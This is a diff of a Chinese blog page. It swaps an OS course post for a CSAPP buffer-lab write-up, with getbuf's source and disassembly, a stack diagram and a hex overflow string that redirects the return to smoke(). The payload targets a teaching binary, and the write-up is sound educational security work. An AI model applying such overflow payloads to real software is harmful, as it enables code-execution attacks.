@@ -6,21 +6,22 @@
     <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="generator" content="一人Code">
-    <title>清华操作系统课程学习 - 一人Code</title>
+    <title>CSAPP Lab3 解题分析 - 一人Code</title>
     <meta name="author" content="Xin Qiu">
     
     
     
-    <meta name="description" content="ucore">
+    <meta name="description" content="csapp">
 <meta property="og:type" content="blog">
-<meta property="og:title" content="清华操作系统课程学习">
-<meta property="og:url" content="http://xinqiu.me/2016/03/17/ucore/index.html">
+<meta property="og:title" content="CSAPP Lab3 解题分析">
+<meta property="og:url" content="http://xinqiu.me/2016/03/30/csapp-lab2-buflab/index.html">
 <meta property="og:site_name" content="一人Code">
-<meta property="og:description" content="ucore">
-<meta property="og:updated_time" content="2016-03-25T02:56:14.000Z">
+<meta property="og:description" content="csapp">
+<meta property="og:image" content="http://xinqiu.me/stack-frame-structure.png">
+<meta property="og:updated_time" content="2016-03-30T12:22:56.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="清华操作系统课程学习">
-<meta name="twitter:description" content="ucore">
+<meta name="twitter:title" content="CSAPP Lab3 解题分析">
+<meta name="twitter:description" content="csapp">
     
     
         
@@ -242,13 +243,13 @@
         <div class="post-header main-content-wrap text-left">
     
         <h1 class="post-title" itemprop="headline">
-            清华操作系统课程学习
+            CSAPP Lab3 解题分析
         </h1>
     
     <div class="post-meta">
-    <time itemprop="datePublished" content="Thu Mar 17 2016 00:00:00 GMT+0800">
+    <time itemprop="datePublished" content="Wed Mar 30 2016 00:00:00 GMT+0800">
 	
-		    Mar 17, 2016
+		    Mar 30, 2016
     	
     </time>
     
@@ -257,73 +258,21 @@
     
     <div class="post-content markdown" itemprop="articleBody">
         <div class="main-content-wrap">
-            <blockquote>
-<p>因为学习操作系统，因为还有一些其他事情要做，所以没有直接上MIT 6.828,选择了清华的操作系统课和配套的ucore。</p>
-</blockquote>
-<h2 id="u4ECE_u673A_u5668_u542F_u52A8_u5230_u64CD_u4F5C_u7CFB_u7EDF_u8FD0_u884C_u7684_u8FC7_u7A0B"><a href="#u4ECE_u673A_u5668_u542F_u52A8_u5230_u64CD_u4F5C_u7CFB_u7EDF_u8FD0_u884C_u7684_u8FC7_u7A0B" class="headerlink" title="从机器启动到操作系统运行的过程"></a>从机器启动到操作系统运行的过程</h2><p>在机器接通电源后， 会向主板发送一个信号。一旦主板收到电源妥协信号后，主板会尝试启动CPU，CPU复位寄存器里的所有数据， 设置预定值给每个寄存器。同时执行系统初始化软件完成基本IO初始化和引导加载功能。为最终调用操作系统内核准备好正确的环境。最终引导加载程序把操作系统内核映像加载到RAM中，并将系统控制权传递给它。</p>
-<p>以Intel 80386为例，计算机加电后，CPU从物理地址0xFFFFFFF0(由初始化的CS：EIP确定，此时CS和IP的值分别是0xF000和0xFFF0)开始执行。8086 处理器有一个20位寻址总线，这意味着它可以对0到 2^20 位地址空间进行操作（ 1Mb ）。不过它只有16位的寄存器，通过这个16位寄存器最大寻址是 2^16 即 0xffff （64 Kb）。实模式使用分段机制来管理整个内存空间。所有内存被分成固定的 64KB 大小的小块。由于我们不能用16位寄存器寻址大于 64KB 的内存，一种替代的方法被设计出来了。一个地址包括两个部分：数据段起始地址和从该数据段起的偏移量。为了得到内存中的物理地址，我们要让数据段乘16并加上偏移量：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PhysicalAddress = Segment * 16 + Offset</span><br></pre></td></tr></table></figure>
-<p>通过阅读 kernel boot protocol，在内核被引导如内存后，内存使用情况将入下表所示：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">         | Protected-mode kernel  |&#10;100000   +------------------------+&#10;         | I/O memory hole        |&#10;0A0000   +------------------------+&#10;         | Reserved for BIOS      | Leave as much as possible unused&#10;         ~                        ~&#10;         | Command line           | (Can also be below the X+10000 mark)&#10;X+10000  +------------------------+&#10;         | Stack/heap             | For use by the kernel real-mode code.&#10;X+08000  +------------------------+&#10;         | Kernel setup           | The kernel real-mode code.&#10;         | Kernel boot sector     | The kernel legacy boot sector.&#10;       X +------------------------+&#10;         | Boot loader            | &#60;- Boot sector entry point 0x7C00&#10;001000   +------------------------+&#10;         | Reserved for MBR/BIOS  |&#10;000800   +------------------------+&#10;         | Typically used by MBR  |&#10;000600   +------------------------+&#10;         | BIOS use only          |&#10;000000   +------------------------+</span><br></pre></td></tr></table></figure>
-<p>所以当 bootloader 完成任务，将执行权移交给 kernel，kernel 的代码从以下地址开始执行：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x1000 + X + sizeof(KernelBootSector) + 1</span><br></pre></td></tr></table></figure>
-<p>上面的公式中， X 是 kernel bootsector 被引导如内存的位置。</p>
-<h2 id="Lab_1"><a href="#Lab_1" class="headerlink" title="Lab 1"></a>Lab 1</h2><h3 id="u7EC3_u4E601"><a href="#u7EC3_u4E601" class="headerlink" title="练习1"></a>练习1</h3><p>1.操作系统镜像文件ucore.img是如何一步一步生成的？</p>
-<p>在进行 <code>make V=</code>后，通过显示的信息，可以知道先对C文件进行了编译。分别编译了一下文件:</p>
-<ul>
-<li>cc kern/init/init.c 初始化系统</li>
-<li>cc kern/libs/readline.c 从输入中读取一行</li>
-<li>cc kern/libs/stdio.c 标准化IO</li>
-<li>cc kern/debug/kdebug.c debug支撑文件</li>
-<li>cc kern/debug/kmonitor.c 命令行显示器</li>
-<li>cc kern/debug/panic.c 显示错误警告</li>
-<li>cc kern/driver/clock.c 时钟相关</li>
-<li>cc kern/driver/console.c 控制台显示</li>
-<li>cc kern/driver/intr.c 中断请求</li>
-<li>cc kern/driver/picirq.c 中断控制器</li>
-<li>cc kern/trap/trap.c 中断处理</li>
-<li>cc kern/trap/trapentry.S 中断预处理</li>
-<li>cc kern/trap/vectors.S 中断向量表</li>
-<li>cc kern/mm/pmm.c 全局描述符表</li>
-<li>cc libs/printfmt.c 输出格式</li>
-<li>cc libs/string.c 字符串操作</li>
-<li>cc boot/bootasm.S Boot Loader程序</li>
-<li>cc boot/bootmain.c Boot Loader程序</li>
-<li>cc tools/sign.c 硬盘主引导扇区检测</li>
-</ul>
-<p>接着 <code>ld</code> 命令对编译好的 <code>.o</code> 文件进行链接，生成了引导扇区。</p>
-<p>之后用 <code>dd</code> 创建了一块空间，并将 <code>bootblock</code> 放入这块空间做成 <code>img</code> 硬盘。</p>
-<p>2.一个被系统认为是符合规范的硬盘主引导扇区的特征是什么？</p>
-<p>从 <code>tools/sign.c</code> 源文件中可以得知， </p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">.....</span><br><span class="line"><span class="keyword">if</span> (st.st_size &gt; <span class="number">510</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%lld &gt;&gt; 510!!\n"</span>, (<span class="keyword">long</span> <span class="keyword">long</span>)st.st_size);</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">512</span>];</span><br><span class="line">......</span><br><span class="line">buf[<span class="number">510</span>] = <span class="number">0x55</span>;</span><br><span class="line">buf[<span class="number">511</span>] = <span class="number">0xAA</span>;</span><br><span class="line">......</span><br><span class="line"><span class="keyword">if</span> (size != <span class="number">512</span>) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"write '%s' error, size is %d.\n"</span>, argv[<span class="number">2</span>], size);</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">fclose(ofp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"build 512 bytes boot sector: '%s' success!\n"</span>, argv[<span class="number">2</span>]);</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
-<p>规范的硬盘主引导扇区大小为512， 并且最后两位必须是 <code>0x55AA</code>.</p>
-<h3 id="u7EC3_u4E602"><a href="#u7EC3_u4E602" class="headerlink" title="练习2"></a>练习2</h3><p>使用qemu执行并调试lab1中的软件，要做一下几个操作：</p>
-<ol>
-<li><p>从CPU加电后执行的第一条指令开始，单步跟踪BIOS的执行。</p>
-</li>
-<li><p>在初始化位置0x7c00设置实地址断点,测试断点正常。</p>
-</li>
-<li><p>从0x7c00开始跟踪代码运行,将单步跟踪反汇编得到的代码与bootasm.S和 bootblock.asm进行比较。</p>
-</li>
-<li><p>自己找一个bootloader或内核中的代码位置，设置断点并进行测试。</p>
-</li>
-</ol>
-<p>根据参考的提示，在 <code>.PHONY: qemu qemu-nox debug debug-nox</code> 下添加</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lab1-mon: $(UCOREIMG)&#10;&#9;$(V)$(TERMINAL) -e &#34;$(QEMU) -S -s -d in_asm -D $(BINDIR)/q.log -monitor stdio -hda $&#60; -serial null&#34;&#10;&#9;$(V)sleep 2&#10;&#9;$(V)$(TERMINAL) -e &#34;gdb -q -x tools/lab1init&#34;</span><br></pre></td></tr></table></figure>
-<p>在调用qemu时添加-d in_asm -D q.log参数可以将运行的汇编指令保存在q.log中。</p>
-<p>另外需要先在<code>lab1/tools/</code>文件夹下新建一个<code>lab1init</code>文件。添加以下内容</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file bin/kernel&#10;target remote :1234&#10;set architecture i8086&#10;break *0x7c00&#10;continue&#10;x /2i $pc</span><br></pre></td></tr></table></figure>
-<p>分别代表加载kernel， 与qemu链接， BIOS是i8086 16位实模式， 在0x7c00处设置断点， 继续运行， 显示指令寄存器上的两条指令。</p>
-<p>make lab1-mon 产生的汇编代码还是稍微有点区别，主要在0x7c1e开始有点区别。</p>
-<p>#####gdb的单步命令</p>
-<p>在gdb中，有next, nexti, step, stepi等指令来单步调试程序，他们功能各不相同，区别在于单步的“跨度”上。</p>
-<ul>
-<li>next 单步到程序源代码的下一行，不进入函数。</li>
-<li>nexti 单步一条机器指令，不进入函数。</li>
-<li>step 单步到下一个不同的源代码行（包括进入函数）。</li>
-<li>stepi 单步一条机器指令。</li>
-</ul>
-<p>To be continued.</p>
+            <p>首先，使用tar xvf命令解压文件后，会有3个可执行的二进制文件bufbomb，hex2raw，makecookie。参考<a href="http://csapp.cs.cmu.edu/3e/buflab32.pdf" target="_blank" rel="external">write-up</a>。</p>
+<h2 id="Level_0"><a href="#Level_0" class="headerlink" title="Level 0"></a>Level 0</h2><p>Bufbomb程序运行会读一个字符串，使用一下函数getbuf:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Buffer size for getbuf */</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> NORMAL_BUFFER_SIZE <span class="number">32</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getbuf</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[NORMAL_BUFFER_SIZE];</span><br><span class="line">	Gets(buf);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Gets函数和标准库的gets功能比较相似，是读取字符串。因为Gets没有办法判断是否buf足够大，所以要用一个函数去判断长度是否小于32。将字符串传入getbuf函数中，若字符串小于32，则返回1.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">080491f4 &#60;getbuf&#62;:&#10; 80491f4:&#9;55                   &#9;push   %ebp&#10; 80491f5:&#9;89 e5                &#9;mov    %esp,%ebp&#10; 80491f7:&#9;83 ec 38             &#9;sub    $0x38,%esp&#10; 80491fa:&#9;8d 45 d8             &#9;lea    -0x28(%ebp),%eax&#10; 80491fd:&#9;89 04 24             &#9;mov    %eax,(%esp)&#10; 8049200:&#9;e8 f5 fa ff ff       &#9;call   8048cfa &#60;Gets&#62;&#10; 8049205:&#9;b8 01 00 00 00       &#9;mov    $0x1,%eax&#10; 804920a:&#9;c9                   &#9;leave  &#10; 804920b:&#9;c3                   &#9;ret</span><br></pre></td></tr></table></figure>
+<p>getbuf是由函数test调用:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;   </span><br><span class="line">  <span class="keyword">int</span> val;   </span><br><span class="line">  <span class="comment">/* Put canary on stack to detect possiblecorruption */</span>   </span><br><span class="line">  <span class="keyword">volatile</span> <span class="keyword">int</span> local = uniqueval();   </span><br><span class="line">   </span><br><span class="line">  val = getbuf();   </span><br><span class="line">   </span><br><span class="line">  <span class="comment">/* Check for corruption stack */</span>   </span><br><span class="line">  <span class="keyword">if</span> (local != uniqueval()) &#123;   </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Sabotaged!: the stack has beencorrupted\n"</span>);   </span><br><span class="line">  &#125;   </span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (val == cookie) &#123;   </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Boom!: getbuf returned0x%x\n"</span>, val);   </span><br><span class="line">    validate(<span class="number">3</span>);   </span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;   </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Dud: getbuf returned0x%x\n"</span>, val);   </span><br><span class="line">  &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中，Smoke源码： </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">smoke</span><span class="params">()</span></span>&#123;   </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Smoke!: You calledsmoke()"</span>);   </span><br><span class="line">  validate(<span class="number">0</span>);   </span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>level 0 的任务是让getbuf在执行后返回时，执行smoke函数，而不是返回test函数中。</p>
+<p>关于堆栈，可以参考书中的这张图 <img src="stack-frame-structure.png" alt=""></p>
+<p>根据上面的汇编代码，可以知道，首先push保存了堆指针(frame pointer)，然后%ebp保存帧指针(stack pointer)，%esp减0x38。lea把buf的指针地址-0x28(%ebp)传给了Gets函数。所以可以画出堆栈图</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+---------------+&#10;|               |&#10;| getbuf&#36820;&#22238;&#22320;&#22336; |&#10;|               |&#10;+---------------+&#10;|               |&#10;|     %ebp      |&#10;|               |&#10;+---------------+&#10;|               |&#10;|               |&#10;|               |&#10;|      buf      |&#10;|               |&#10;|    40 byte    |&#10;|               |&#10;|               |&#10;|               |&#10;+---------------+&#10;|               |&#10;|     %esp      |&#10;|               |&#10;+---------------+</span><br></pre></td></tr></table></figure>
+<p>所以为了修改getbuf返回地址，需要在从buf开始，填充 40 + 4 = 44个字节，并且按照要求，这44个字节要是非0a数。根据汇编得到的smoke地址为08048c18，又因为是电脑小端法，所以构建的文本可以是这样的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 18 8c 04 08</span><br></pre></td></tr></table></figure>
 
             
                 
@@ -336,7 +285,7 @@
             <div class="post-footer-tags">
                 <span class="text-color-light text-small">TAGGED IN</span><br/>
                 
-    <a class="tag tag--primary tag--small t-link" href="/tags/os/">os</a>
+    <a class="tag tag--primary tag--small t-link" href="/tags/csapp/">csapp</a>
 
             </div>
         
@@ -345,7 +294,7 @@
         <ul class="post-actions post-action-nav">
             <li class="post-action">
                 
-                    <a class="post-action-btn btn btn--default tooltip--top" href="/2016/03/30/csapp-lab2-buflab/"  data-tooltip="CSAPP Lab3 解题分析">
+                    <a class="post-action-btn btn btn--disabled">
                 
                     <i class="fa fa-angle-left"></i>
                     <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
@@ -353,7 +302,7 @@
             </li>
             <li class="post-action">
                 
-                    <a class="post-action-btn btn btn--default tooltip--top" href="/2016/03/12/csi-start/" data-tooltip="基于CSI的移动目标侦测研究学习">
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/2016/03/17/ucore/" data-tooltip="清华操作系统课程学习">
                 
                     <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
                     <i class="fa fa-angle-right"></i>
@@ -368,17 +317,17 @@
             </a>
         </li>
         <li class="post-action hide-xs">
-            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=http://xinqiu.me/2016/03/17/ucore/">
+            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=http://xinqiu.me/2016/03/30/csapp-lab2-buflab/">
                 <i class="fa fa-google-plus"></i>
             </a>
         </li>
         <li class="post-action hide-xs">
-            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://xinqiu.me/2016/03/17/ucore/">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://xinqiu.me/2016/03/30/csapp-lab2-buflab/">
                 <i class="fa fa-facebook-official"></i>
             </a>
         </li>
         <li class="post-action hide-xs">
-            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=http://xinqiu.me/2016/03/17/ucore/">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=http://xinqiu.me/2016/03/30/csapp-lab2-buflab/">
                 <i class="fa fa-twitter"></i>
             </a>
         </li>
@@ -426,7 +375,7 @@
         <ul class="post-actions post-action-nav">
             <li class="post-action">
                 
-                    <a class="post-action-btn btn btn--default tooltip--top" href="/2016/03/30/csapp-lab2-buflab/"  data-tooltip="CSAPP Lab3 解题分析">
+                    <a class="post-action-btn btn btn--disabled">
                 
                     <i class="fa fa-angle-left"></i>
                     <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
@@ -434,7 +383,7 @@
             </li>
             <li class="post-action">
                 
-                    <a class="post-action-btn btn btn--default tooltip--top" href="/2016/03/12/csi-start/" data-tooltip="基于CSI的移动目标侦测研究学习">
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/2016/03/17/ucore/" data-tooltip="清华操作系统课程学习">
                 
                     <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
                     <i class="fa fa-angle-right"></i>
@@ -449,17 +398,17 @@
             </a>
         </li>
         <li class="post-action hide-xs">
-            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=http://xinqiu.me/2016/03/17/ucore/">
+            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=http://xinqiu.me/2016/03/30/csapp-lab2-buflab/">
                 <i class="fa fa-google-plus"></i>
             </a>
         </li>
         <li class="post-action hide-xs">
-            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://xinqiu.me/2016/03/17/ucore/">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://xinqiu.me/2016/03/30/csapp-lab2-buflab/">
                 <i class="fa fa-facebook-official"></i>
             </a>
         </li>
         <li class="post-action hide-xs">
-            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=http://xinqiu.me/2016/03/17/ucore/">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=http://xinqiu.me/2016/03/30/csapp-lab2-buflab/">
                 <i class="fa fa-twitter"></i>
             </a>
         </li>
@@ -485,17 +434,17 @@
                 <div id="share-options-bar" class="share-options-bar" data-behavior="3">
     <ul class="share-options">
         <li class="share-option">
-            <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=http://xinqiu.me/2016/03/17/ucore/">
+            <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=http://xinqiu.me/2016/03/30/csapp-lab2-buflab/">
                 <i class="fa fa-google-plus"></i><span class="">Share on Google Plus</span>
             </a>
         </li>
         <li class="share-option">
-            <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://xinqiu.me/2016/03/17/ucore/">
+            <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://xinqiu.me/2016/03/30/csapp-lab2-buflab/">
                 <i class="fa fa-facebook-official"></i><span>Share on Facebook</span>
             </a>
         </li>
         <li class="share-option">
-            <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=http://xinqiu.me/2016/03/17/ucore/">
+            <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=http://xinqiu.me/2016/03/30/csapp-lab2-buflab/">
                 <i class="fa fa-twitter"></i><span>Share on Twitter</span>
             </a>
         </li>
@@ -552,9 +501,9 @@
     
         <script>
              var disqus_config = function () {
-                 this.page.url = 'http://xinqiu.me/2016/03/17/ucore/';
+                 this.page.url = 'http://xinqiu.me/2016/03/30/csapp-lab2-buflab/';
                  
-                    this.page.identifier = '2016/03/17/ucore/';
+                    this.page.identifier = '2016/03/30/csapp-lab2-buflab/';
                                   
              };
             (function() {
